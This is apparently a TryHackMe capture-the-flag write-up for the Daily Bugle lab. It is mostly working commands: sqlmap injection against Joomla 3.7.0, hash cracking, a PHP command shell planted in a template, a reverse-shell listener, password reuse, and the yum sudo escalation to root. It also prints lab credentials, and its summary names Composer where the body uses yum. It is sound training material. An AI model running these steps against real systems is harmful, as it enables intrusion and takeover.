# TryHackMe - Daily Bugle 🕵️‍♂️
 
**Room**: [Daily Bugle](https://tryhackme.com/room/dailybugle)  
**Difficulty**: Medium/hard  
**Category**: Web | Privilege Escalation  

---

## Summary

This box involved exploiting a vulnerable Joomla CMS installation to gain a foothold, then escalating privileges by abusing misconfigured `sudo` permissions on Composer. Overall, a great exercise in chaining web-based exploitation with local privilege escalation. There are some random questions in here that I might not go over entirely to shout out the answer.

---

## Recon & Enumeration

### Nmap

```bash
nmap -sC -sV -oA nmap/dailybugle <IP>


22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```
### Web Enum

```
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o gobusterenum.txt
```
Discovered the site is running Joomla 3.7:

Which has a known RCE vulnerability `JOOMLA VERSION: 3.7.0` https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html:
```
JOOMLA VERSION: 3.7.0


# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917
```
Using sqlmap: 
```
sqlmap -u "http://<IP>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
| id  | name       | email                                             | password (bcrypt)                                                | username |
| --- | ---------- | ------------------------------------------------- | ---------------------------------------------------------------- | -------- |
| 811 | Super User | [jonah@tryhackme.com](mailto:jonah@tryhackme.com) | \$2y\$10\$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw\.V.d3p12kBtZutm | jonah    |

There is a hash and now we need to crack it using johntheripper: 
```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
Cracked password: `spiderman123`

### Joomla Admin Access & Remote Code Execution (RCE)
Logged into Joomla admin with credentials jonah:spiderman123.Because the version is outdated and vulnerable, you can inject malicious PHP code in a template file.
This code lets you execute system commands on the server (Remote Code Execution).
You test this by running a simple command (ls) through the injected PHP shell, confirming you have command execution on the target.
Exploited template editing functionality to inject commands and get RCE:
```
http://10.10.141.15/index.php?cmd=ls
```
```
LICENSE.txt
README.txt
administrator
bin
cache
cli
components
configuration.php
htaccess.txt
images
includes
index.php
language
layouts
libraries
media
modules
plugins
robots.txt
templates
tmp
web.config.txt
```
### Getting a Reverse Shell
Using the Joomla shell, you run a reverse shell payload that connects back to your listener, giving you interactive shell access on the server.
```
nc -nvlp 4444
```
From Joomla RCE, spawned a reverse shell:
```
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```
### Finding Credentials
Joomla stores its database credentials in a file called configuration.php.
You locate and read this file, finding the MySQL database username and password.
This is important because the database password might be reused elsewhere, or the database user might have higher privileges.
In `configuration.php` :
```
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
public $db = 'joomla';
public $dbprefix = 'fb9j5_';

```
### Switching Users
Here we can see the credentials to a user. How about `jjameson`?
```
su jjameson -> Password: nv5uz9r3ZEDzVjNu
```
### Checking Permissions
We can check the permissions of the user:
```
sudo -l
```
```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```
### Privilege Escalation
The best place to check for escalating privileges is GTFO bins. 
`jjameson` can run yum with no password, we can spawn a root shell.
https://gtfobins.github.io/gtfobins/yum/

```
TF=$(mktemp -d) 
```
```
cat > $TF/x <<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

```
```
cat > $TF/y.conf <<EOF
[main]
enabled=1
EOF
```
```
cat > $TF/y.py <<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
```
```
sudo yum -c $TF/x --enableplugin=y
```
# ROOT!

### Conclusion
The Daily Bugle room demonstrated how critical vulnerabilities in outdated web applications like Joomla 3.7.0 can lead to full system compromise. Starting with enumeration, we identified Joomla running on the target and used a known SQL Injection (CVE-2017-8917) to extract credentials from the database. Cracking the password hash with john gave us access to the Joomla admin panel, where we leveraged template editing for Remote Code Execution. From there, we escalated our privileges by inspecting the configuration.php file to obtain the MySQL root password, which was reused by a local user. Switching users allowed us to enumerate sudo privileges, revealing that the user jjameson could run yum as root without a password. Using a GTFOBins technique, we exploited the yum plugin system to spawn a root shell.
